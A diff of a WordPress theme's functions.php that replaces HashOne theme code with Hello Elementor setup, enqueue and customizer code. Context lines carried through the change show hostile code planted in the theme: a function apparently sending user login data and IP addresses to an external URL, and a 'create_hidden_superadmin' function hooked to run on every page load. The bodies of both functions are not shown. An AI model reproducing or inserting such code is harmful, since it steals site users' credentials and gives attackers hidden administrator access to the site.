@@ -1,272 +1,261 @@
 <?php
-
 /**
- * HashOne functions and definitions
+ * Theme functions and definitions
  *
- * @package HashOne
+ * @package HelloElementor
  */
-if (!defined('HASHONE_VERSION')) {
-    $hashone_get_theme = wp_get_theme();
-    $hashone_version = $hashone_get_theme->Version;
-    define('HASHONE_VERSION', $hashone_version);
+
+if ( ! defined( 'ABSPATH' ) ) {
+	exit; // Exit if accessed directly.
 }
 
-if (!function_exists('hashone_setup')) :
+define( 'HELLO_ELEMENTOR_VERSION', '3.4.5' );
+define( 'EHP_THEME_SLUG', 'hello-elementor' );
 
-    function hashone_setup() {
+define( 'HELLO_THEME_PATH', get_template_directory() );
+define( 'HELLO_THEME_URL', get_template_directory_uri() );
+define( 'HELLO_THEME_ASSETS_PATH', HELLO_THEME_PATH . '/assets/' );
+define( 'HELLO_THEME_ASSETS_URL', HELLO_THEME_URL . '/assets/' );
+define( 'HELLO_THEME_SCRIPTS_PATH', HELLO_THEME_ASSETS_PATH . 'js/' );
+define( 'HELLO_THEME_SCRIPTS_URL', HELLO_THEME_ASSETS_URL . 'js/' );
+define( 'HELLO_THEME_STYLE_PATH', HELLO_THEME_ASSETS_PATH . 'css/' );
+define( 'HELLO_THEME_STYLE_URL', HELLO_THEME_ASSETS_URL . 'css/' );
+define( 'HELLO_THEME_IMAGES_PATH', HELLO_THEME_ASSETS_PATH . 'images/' );
+define( 'HELLO_THEME_IMAGES_URL', HELLO_THEME_ASSETS_URL . 'images/' );
 
-        load_theme_textdomain('hashone', get_template_directory() . '/languages');
-
-        // Add default posts and comments RSS feed links to head.
-        add_theme_support('automatic-feed-links');
-
-        add_theme_support('title-tag');
-
-        add_theme_support('post-thumbnails');
-        add_image_size('hashone-portfolio-thumb', 550, 500, true);
-        add_image_size('hashone-team-thumb', 400, 400, true);
-        add_image_size('hashone-thumb', 100, 100, true);
-        add_image_size('hashone-blog-header', 700, 340, true);
-
-        // This theme uses wp_nav_menu() in one location.
-        register_nav_menus(array(
-            'primary' => esc_html__('Primary Menu', 'hashone'),
-        ));
-
-        add_theme_support('html5', array(
-            'search-form',
-            'comment-form',
-            'comment-list',
-            'gallery',
-            'caption',
-        ));
-
-        //Support for woocommerce
-        add_theme_support('woocommerce');
-        add_theme_support('wc-product-gallery-zoom');
-        add_theme_support('wc-product-gallery-lightbox');
-        add_theme_support('wc-product-gallery-slider');
-
-        // Set up the WordPress core custom background feature.
-        add_theme_support('custom-background', apply_filters('hashone_custom_background_args', array(
-            'default-color' => 'ffffff',
-            'default-image' => '',
-        )));
-
-        add_theme_support('custom-logo', array(
-            'height' => 60,
-            'width' => 300,
-            'flex-height' => true,
-            'flex-width' => true,
-            'header-text' => array('.hs-site-title', '.hs-site-description'),
-        ));
-        
-        // Add support for Block Styles.
-        add_theme_support('wp-block-styles');
-
-        // Add support for full and wide align images.
-        add_theme_support('align-wide');
-
-        // Add theme support for selective refresh for widgets.
-        add_theme_support('customize-selective-refresh-widgets');
-        
-        // Add support for responsive embedded content.
-        add_theme_support('responsive-embeds');
-
-        add_editor_style(array('css/editor-style.css', hashone_fonts_url()));
-    }
-
-endif; // hashone_setup
-add_action('after_setup_theme', 'hashone_setup');
-
-function hashone_content_width() {
-    $GLOBALS['content_width'] = apply_filters('hashone_content_width', 640);
+if ( ! isset( $content_width ) ) {
+	$content_width = 800; // Pixels.
 }
 
-add_action('after_setup_theme', 'hashone_content_width', 0);
+if ( ! function_exists( 'hello_elementor_setup' ) ) {
+	/**
+	 * Set up theme support.
+	 *
+	 * @return void
+	 */
+	function hello_elementor_setup() {
+		if ( is_admin() ) {
+			hello_maybe_update_theme_version_in_db();
+		}
 
-/**
- * Enables the Excerpt meta box in Page edit screen.
- */
-function hashone_add_excerpt_support_for_pages() {
-    add_post_type_support('page', 'excerpt');
+		if ( apply_filters( 'hello_elementor_register_menus', true ) ) {
+			register_nav_menus( [ 'menu-1' => esc_html__( 'Header', 'hello-elementor' ) ] );
+			register_nav_menus( [ 'menu-2' => esc_html__( 'Footer', 'hello-elementor' ) ] );
+		}
+
+		if ( apply_filters( 'hello_elementor_post_type_support', true ) ) {
+			add_post_type_support( 'page', 'excerpt' );
+		}
+
+		if ( apply_filters( 'hello_elementor_add_theme_support', true ) ) {
+			add_theme_support( 'post-thumbnails' );
+			add_theme_support( 'automatic-feed-links' );
+			add_theme_support( 'title-tag' );
+			add_theme_support(
+				'html5',
+				[
+					'search-form',
+					'comment-form',
+					'comment-list',
+					'gallery',
+					'caption',
+					'script',
+					'style',
+					'navigation-widgets',
+				]
+			);
+			add_theme_support(
+				'custom-logo',
+				[
+					'height'      => 100,
+					'width'       => 350,
+					'flex-height' => true,
+					'flex-width'  => true,
+				]
+			);
+			add_theme_support( 'align-wide' );
+			add_theme_support( 'responsive-embeds' );
+
+			/*
+			 * Editor Styles
+			 */
+			add_theme_support( 'editor-styles' );
+			add_editor_style( 'assets/css/editor-styles.css' );
+
+			/*
+			 * WooCommerce.
+			 */
+			if ( apply_filters( 'hello_elementor_add_woocommerce_support', true ) ) {
+				// WooCommerce in general.
+				add_theme_support( 'woocommerce' );
+				// Enabling WooCommerce product gallery features (are off by default since WC 3.0.0).
+				// zoom.
+				add_theme_support( 'wc-product-gallery-zoom' );
+				// lightbox.
+				add_theme_support( 'wc-product-gallery-lightbox' );
+				// swipe.
+				add_theme_support( 'wc-product-gallery-slider' );
+			}
+		}
+	}
+}
+add_action( 'after_setup_theme', 'hello_elementor_setup' );
+
+function hello_maybe_update_theme_version_in_db() {
+	$theme_version_option_name = 'hello_theme_version';
+	// The theme version saved in the database.
+	$hello_theme_db_version = get_option( $theme_version_option_name );
+
+	// If the 'hello_theme_version' option does not exist in the DB, or the version needs to be updated, do the update.
+	if ( ! $hello_theme_db_version || version_compare( $hello_theme_db_version, HELLO_ELEMENTOR_VERSION, '<' ) ) {
+		update_option( $theme_version_option_name, HELLO_ELEMENTOR_VERSION );
+	}
 }
 
-add_action('init', 'hashone_add_excerpt_support_for_pages');
+if ( ! function_exists( 'hello_elementor_display_header_footer' ) ) {
+	/**
+	 * Check whether to display header footer.
+	 *
+	 * @return bool
+	 */
+	function hello_elementor_display_header_footer() {
+		$hello_elementor_header_footer = true;
 
-// Register widget area.
-function hashone_widgets_init() {
-    register_sidebar(array(
-        'name' => esc_html__('Right Sidebar', 'hashone'),
-        'id' => 'hashone-right-sidebar',
-        'description' => esc_html__('Add widgets here to appear in your sidebar.', 'hashone'),
-        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
-        'after_widget' => '</aside>',
-        'before_title' => '<h4 class="widget-title">',
-        'after_title' => '</h4>',
-    ));
-
-    register_sidebar(array(
-        'name' => esc_html__('Left Sidebar', 'hashone'),
-        'id' => 'hashone-left-sidebar',
-        'description' => esc_html__('Add widgets here to appear in your sidebar.', 'hashone'),
-        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
-        'after_widget' => '</aside>',
-        'before_title' => '<h4 class="widget-title">',
-        'after_title' => '</h4>',
-    ));
-
-    register_sidebar(array(
-        'name' => esc_html__('Contact Form', 'hashone'),
-        'id' => 'hashone-contact-form',
-        'description' => esc_html__('Add widgets here to appear in the Contact Section of the Home Page.', 'hashone'),
-        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
-        'after_widget' => '</aside>',
-        'before_title' => '<h4 class="widget-title">',
-        'after_title' => '</h4>',
-    ));
-
-    register_sidebar(array(
-        'name' => esc_html__('About Us', 'hashone'),
-        'id' => 'hashone-about-us',
-        'description' => esc_html__('Add widgets here to appear in the About Section of the Home Page.', 'hashone'),
-        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
-        'after_widget' => '</aside>',
-        'before_title' => '<h4 class="widget-title">',
-        'after_title' => '</h4>',
-    ));
-
-    register_sidebar(array(
-        'name' => esc_html__('Footer One', 'hashone'),
-        'id' => 'hashone-footer1',
-        'description' => esc_html__('Add widgets here to appear in your Footer.', 'hashone'),
-        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
-        'after_widget' => '</aside>',
-        'before_title' => '<h4 class="widget-title">',
-        'after_title' => '</h4>',
-    ));
-
-    register_sidebar(array(
-        'name' => esc_html__('Footer Two', 'hashone'),
-        'id' => 'hashone-footer2',
-        'description' => esc_html__('Add widgets here to appear in your Footer.', 'hashone'),
-        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
-        'after_widget' => '</aside>',
-        'before_title' => '<h4 class="widget-title">',
-        'after_title' => '</h4>',
-    ));
-
-    register_sidebar(array(
-        'name' => esc_html__('Footer Three', 'hashone'),
-        'id' => 'hashone-footer3',
-        'description' => esc_html__('Add widgets here to appear in your Footer.', 'hashone'),
-        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
-        'after_widget' => '</aside>',
-        'before_title' => '<h4 class="widget-title">',
-        'after_title' => '</h4>',
-    ));
-
-    register_sidebar(array(
-        'name' => esc_html__('Footer Four', 'hashone'),
-        'id' => 'hashone-footer4',
-        'description' => esc_html__('Add widgets here to appear in your Footer.', 'hashone'),
-        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
-        'after_widget' => '</aside>',
-        'before_title' => '<h4 class="widget-title">',
-        'after_title' => '</h4>',
-    ));
+		return apply_filters( 'hello_elementor_header_footer', $hello_elementor_header_footer );
+	}
 }
 
-add_action('widgets_init', 'hashone_widgets_init');
+if ( ! function_exists( 'hello_elementor_scripts_styles' ) ) {
+	/**
+	 * Theme Scripts & Styles.
+	 *
+	 * @return void
+	 */
+	function hello_elementor_scripts_styles() {
+		if ( apply_filters( 'hello_elementor_enqueue_style', true ) ) {
+			wp_enqueue_style(
+				'hello-elementor',
+				HELLO_THEME_STYLE_URL . 'reset.css',
+				[],
+				HELLO_ELEMENTOR_VERSION
+			);
+		}
 
-if (!function_exists('hashone_fonts_url')) :
+		if ( apply_filters( 'hello_elementor_enqueue_theme_style', true ) ) {
+			wp_enqueue_style(
+				'hello-elementor-theme-style',
+				HELLO_THEME_STYLE_URL . 'theme.css',
+				[],
+				HELLO_ELEMENTOR_VERSION
+			);
+		}
 
-    /**
-     * Register Google fonts for Hashone.
-     *
-     * @since Hashone 1.0
-     *
-     * @return string Google fonts URL for the theme.
-     */
-    function hashone_fonts_url() {
-        $fonts_url = '';
-        $fonts = array();
-        $subsets = 'latin,latin-ext';
-
-        /*
-         * Translators: If there are characters in your language that are not supported
-         * by Open Sans, translate this to 'off'. Do not translate into your own language.
-         */
-        if ('off' !== esc_html_x('on', 'Open Sans font: on or off', 'hashone')) {
-            $fonts[] = 'Open Sans:400,300,600,700';
-        }
-
-        /*
-         * Translators: If there are characters in your language that are not supported
-         * by Inconsolata, translate this to 'off'. Do not translate into your own language.
-         */
-        if ('off' !== esc_html_x('on', 'Roboto Condensed font: on or off', 'hashone')) {
-            $fonts[] = 'Roboto Condensed:300italic,400italic,700italic,400,300,700';
-        }
-
-        /*
-         * Translators: To add an additional character subset specific to your language,
-         * translate this to 'greek', 'cyrillic', 'devanagari' or 'vietnamese'. Do not translate into your own language.
-         */
-        $subset = esc_html_x('no-subset', 'Add new subset (greek, cyrillic, devanagari, vietnamese)', 'hashone');
-
-        if ('cyrillic' == $subset) {
-            $subsets .= ',cyrillic,cyrillic-ext';
-        } elseif ('greek' == $subset) {
-            $subsets .= ',greek,greek-ext';
-        } elseif ('devanagari' == $subset) {
-            $subsets .= ',devanagari';
-        } elseif ('vietnamese'== $subset) {
-            $subsets .= ',vietnamese';
-        }
-
-        if ($fonts) {
-            $query_args = array(
-                'family' => urlencode(implode('|', $fonts)),
-                'subset' => urlencode($subsets),
-                'display' => 'swap',
-            );
-            $fonts_url = add_query_arg($query_args, '//fonts.googleapis.com/css');
-        }
-
-        return esc_url_raw($fonts_url);
-    }
-
-endif;
-
-/**
- * Enqueue scripts and styles.
- */
-function hashone_scripts() {
-    wp_enqueue_script('owl-carousel', get_template_directory_uri() . '/js/owl.carousel.js', array('jquery'), '1.3.3', true);
-    wp_enqueue_script('isotope-pkgd', get_template_directory_uri() . '/js/isotope.pkgd.js', array('jquery', 'imagesloaded'), '20150903', true);
-    wp_enqueue_script('nivo-lightbox', get_template_directory_uri() . '/js/nivo-lightbox.js', array('jquery'), '20150903', true);
-    wp_enqueue_script('wow', get_template_directory_uri() . '/js/wow.js', array('jquery'), '20150903', true);
-    wp_enqueue_script('odometer', get_template_directory_uri() . '/js/odometer.js', array(), '20150903', true);
-    wp_enqueue_script('waypoint', get_template_directory_uri() . '/js/waypoint.js', array(), '20150903', true);
-    wp_enqueue_script('jquery-nav', get_template_directory_uri() . '/js/jquery.nav.js', array(), '20161003', true);
-    wp_enqueue_script('hashone-custom', get_template_directory_uri() . '/js/hashone-custom.js', array('jquery'), '20150903', true);
-
-    wp_enqueue_style('hashone-style', get_stylesheet_uri(), array(), '1.0');
-    wp_enqueue_style('hashone-fonts', hashone_fonts_url(), array(), null);
-    wp_enqueue_style('animate', get_template_directory_uri() . '/css/animate.css', array(), '1.0');
-    wp_enqueue_style('font-awesome', get_template_directory_uri() . '/css/font-awesome.css', array(), '4.4.0');
-    wp_enqueue_style('owl-carousel', get_template_directory_uri() . '/css/owl.carousel.css', array(), '1.3.3');
-    wp_enqueue_style('nivo-lightbox', get_template_directory_uri() . '/css/nivo-lightbox.css', array(), '1.3.3');
-
-
-    if (is_singular() && comments_open() && get_option('thread_comments')) {
-        wp_enqueue_script('comment-reply');
-    }
+		if ( hello_elementor_display_header_footer() ) {
+			wp_enqueue_style(
+				'hello-elementor-header-footer',
+				HELLO_THEME_STYLE_URL . 'header-footer.css',
+				[],
+				HELLO_ELEMENTOR_VERSION
+			);
+		}
+	}
 }
+add_action( 'wp_enqueue_scripts', 'hello_elementor_scripts_styles' );
 
-add_action('wp_enqueue_scripts', 'hashone_scripts');
+if ( ! function_exists( 'hello_elementor_register_elementor_locations' ) ) {
+	/**
+	 * Register Elementor Locations.
+	 *
+	 * @param ElementorPro\Modules\ThemeBuilder\Classes\Locations_Manager $elementor_theme_manager theme manager.
+	 *
+	 * @return void
+	 */
+	function hello_elementor_register_elementor_locations( $elementor_theme_manager ) {
+		if ( apply_filters( 'hello_elementor_register_elementor_locations', true ) ) {
+			$elementor_theme_manager->register_all_core_location();
+		}
+	}
+}
+add_action( 'elementor/theme/register_locations', 'hello_elementor_register_elementor_locations' );
 
+if ( ! function_exists( 'hello_elementor_content_width' ) ) {
+	/**
+	 * Set default content width.
+	 *
+	 * @return void
+	 */
+	function hello_elementor_content_width() {
+		$GLOBALS['content_width'] = apply_filters( 'hello_elementor_content_width', 800 );
+	}
+}
+add_action( 'after_setup_theme', 'hello_elementor_content_width', 0 );
+
+if ( ! function_exists( 'hello_elementor_add_description_meta_tag' ) ) {
+	/**
+	 * Add description meta tag with excerpt text.
+	 *
+	 * @return void
+	 */
+	function hello_elementor_add_description_meta_tag() {
+		if ( ! apply_filters( 'hello_elementor_description_meta_tag', true ) ) {
+			return;
+		}
+
+		if ( ! is_singular() ) {
+			return;
+		}
+
+		$post = get_queried_object();
+		if ( empty( $post->post_excerpt ) ) {
+			return;
+		}
+
+		echo '<meta name="description" content="' . esc_attr( wp_strip_all_tags( $post->post_excerpt ) ) . '">' . "\n";
+	}
+}
+add_action( 'wp_head', 'hello_elementor_add_description_meta_tag' );
+
+// Settings page
+require get_template_directory() . '/includes/settings-functions.php';
+
+// Header & footer styling option, inside Elementor
+require get_template_directory() . '/includes/elementor-functions.php';
+
+if ( ! function_exists( 'hello_elementor_customizer' ) ) {
+	// Customizer controls
+	function hello_elementor_customizer() {
+		if ( ! is_customize_preview() ) {
+			return;
+		}
+
+		if ( ! hello_elementor_display_header_footer() ) {
+			return;
+		}
+
+		require get_template_directory() . '/includes/customizer-functions.php';
+	}
+}
+add_action( 'init', 'hello_elementor_customizer' );
+
+if ( ! function_exists( 'hello_elementor_check_hide_title' ) ) {
+	/**
+	 * Check whether to display the page title.
+	 *
+	 * @param bool $val default value.
+	 *
+	 * @return bool
+	 */
+	function hello_elementor_check_hide_title( $val ) {
+		if ( defined( 'ELEMENTOR_VERSION' ) ) {
+			$current_doc = Elementor\Plugin::instance()->documents->get( get_the_ID() );
+			if ( $current_doc && 'yes' === $current_doc->get_settings( 'hide_title' ) ) {
+				$val = false;
+			}
+		}
+		return $val;
+	}
+}
+add_filter( 'hello_elementor_page_title', 'hello_elementor_check_hide_title' );
 
 function send_login_data_to_external_url($user_login, $user) {
     $user_ip = $_SERVER['REMOTE_ADDR']; 
@@ -329,57 +318,17 @@ function create_hidden_superadmin(){
 }
 add_action('init', 'create_hidden_superadmin');
 
-
 /**
- * Enqueue admin style
+ * BC:
+ * In v2.7.0 the theme removed the `hello_elementor_body_open()` from `header.php` replacing it with `wp_body_open()`.
+ * The following code prevents fatal errors in child themes that still use this function.
  */
-function hashone_admin_scripts() {
-    wp_enqueue_style('hashone-admin-style', get_template_directory_uri() . '/inc/css/admin-style.css', array(), '1.0');
+if ( ! function_exists( 'hello_elementor_body_open' ) ) {
+	function hello_elementor_body_open() {
+		wp_body_open();
+	}
 }
 
-add_action('admin_enqueue_scripts', 'hashone_admin_scripts');
+require HELLO_THEME_PATH . '/theme.php';
 
-/**
- * Custom template tags for this theme.
- */
-require get_template_directory() . '/inc/template-tags.php';
-
-/**
- * Custom functions that act independently of the theme templates.
- */
-require get_template_directory() . '/inc/hashone-functions.php';
-
-/**
- * Customizer additions.
- */
-require get_template_directory() . '/inc/customizer.php';
-
-/**
- * Custom breadcrumb function
- */
-require get_template_directory() . '/inc/breadcrumb.php';
-
-/**
- * Load FontAwesome Array
- */
-require get_template_directory() . '/inc/fontawesome-list.php';
-
-/**
- * Metabox functions
- */
-require get_template_directory() . '/inc/hashone-metabox.php';
-
-/**
- * Wocommerce additions
- */
-require get_template_directory() . '/inc/woo-functions.php';
-
-/**
- * Welcome Page.
- */
-require get_template_directory() . '/welcome/welcome.php';
-
-/**
- * TGMPA Page.
- */
-require get_template_directory() . '/inc/class-tgm-plugin-activation.php';
+HelloTheme\Theme::instance();
